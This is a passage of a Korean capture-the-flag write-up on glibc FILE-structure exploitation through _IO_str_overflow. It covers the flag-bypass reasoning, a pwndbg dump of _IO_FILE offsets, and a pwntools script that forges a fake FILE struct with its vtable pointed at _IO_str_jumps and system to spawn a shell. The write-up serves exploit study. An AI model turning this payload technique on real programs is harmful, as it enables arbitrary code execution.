2 : 두번째 !(fp->_flags & _IO_CURRENTLY_PUTTING(0x0800)) 이 조건에서 flags는 현재 0x0800으로 설정되어 있기떄문에 2번쨰의 조건을 만족하지못해 패스한다.

3 : pos >= (_IO_size_t) (_IO_blen (fp) + flush_only) 에서 pos와 _IO_blen(fp)
와 flush_only를 더한값을 비교하는데 _IO_blen은 #define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base) 로 정의가 되어있다.
flush_only는 EOF로 -1.

fp->_IO_write_ptr - fp->_IO_write_base >= _IO_buf_end - _IO_buf_base + (-1)

통과하면 flags가 _IO_USER_BUF인지 검사하는데 이를 우회하기위해 flags값을 0xfbad2887 -> 0xfbad2886으로 변경해주어야한다.

4 : new size 에 2*((fp)->_IO_buf_end - (fp)->_IO_buf_base) + 100 계산을하고 넣는다. 우리는 new_size에 binsh주소값을 넣을예정이라 binsh주소를 역연산해서 넣어줘야한다.

offset
```
pwndbg>  ptype /o struct _IO_FILE
/* offset      |    size */  type = struct _IO_FILE {
/*      0      |       4 */    int _flags;
/* XXX  4-byte hole      */
/*      8      |       8 */    char *_IO_read_ptr;
/*     16      |       8 */    char *_IO_read_end;
/*     24      |       8 */    char *_IO_read_base;
/*     32      |       8 */    char *_IO_write_base;
/*     40      |       8 */    char *_IO_write_ptr;
/*     48      |       8 */    char *_IO_write_end;
/*     56      |       8 */    char *_IO_buf_base;
/*     64      |       8 */    char *_IO_buf_end;
/*     72      |       8 */    char *_IO_save_base;
/*     80      |       8 */    char *_IO_backup_base;
/*     88      |       8 */    char *_IO_save_end;
/*     96      |       8 */    struct _IO_marker *_markers;
/*    104      |       8 */    struct _IO_FILE *_chain;
/*    112      |       4 */    int _fileno;
/*    116      |       4 */    int _flags2;
/*    120      |       8 */    __off_t _old_offset;
/*    128      |       2 */    unsigned short _cur_column;
/*    130      |       1 */    signed char _vtable_offset;
/*    131      |       1 */    char _shortbuf[1];
/* XXX  4-byte hole      */
/*    136      |       8 */    _IO_lock_t *_lock;
/*    144      |       8 */    __off64_t _offset;
/*    152      |       8 */    struct _IO_codecvt *_codecvt;
/*    160      |       8 */    struct _IO_wide_data *_wide_data;
/*    168      |       8 */    struct _IO_FILE *_freeres_list;
/*    176      |       8 */    void *_freeres_buf;
/*    184      |       8 */    size_t __pad5;
/*    192      |       4 */    int _mode;
/*    196      |      20 */    char _unused2[20];

                               /* total size (bytes):  216 */
                             }

```

## exploit 


```python

pay+=p64(0)
pay+=p64(stdin)*4
pay+=p64(leak_stdout) #_IO_buf_base
pay+=p64(leak_stdout+0x2000) #_IO_buf_end
pay=pay.ljust(0x84,b'\x00')
p.sendline(pay)

log.info("step1 clear")
one_gadget=libc_main+0x4f365
#exploit
pay=p32(0xfbad2886)
pay+=p32(0)
pay+=p64(leak_stdout)*3
pay+=p64(0)#write_base => 0
pay+=p64((binsh-100)//2) #write_ptr
pay+=p64(0)*2 #write_end,buf_base
pay+=p64((binsh-100)//2) #buf_end
pay+=p64(0)*4
pay+=p64(stdin) #chain
pay+=p32(1)
pay+=p32(0)
pay+=p64(0xffffffffffffffff) #old offset
pay+=p16(0)
pay+=p8(0)
pay+=b"\n" #short buf
pay+=p32(0) #hole
pay+=p64(lock)
pay+=p64(0xffffffffffffffff) #offset
pay+=p64(0)
pay+=p64(wide_data)
pay+=p64(0)*2 #freeres_list,buf
pay+=p64(0)
pay+=p32(0xffffffff)
pay+=b'\0'*20
print(len(pay))
pay+=p64(str_jumps)
pay+=p64(system)
pay+=p64(leak_stdout)

```

